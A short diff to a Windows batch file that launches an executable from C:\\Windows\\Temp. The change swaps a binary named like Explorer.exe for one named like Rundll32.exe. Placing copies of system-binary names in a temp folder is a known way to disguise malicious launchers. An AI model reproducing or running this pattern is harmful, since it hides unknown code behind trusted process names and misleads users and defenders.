@@ -1,3 +1,3 @@
 @echo off
-start C:\\Windows\\Temp\\Explorer.exe
+start C:\\Windows\\Temp\\Rundll32.exe
 exit
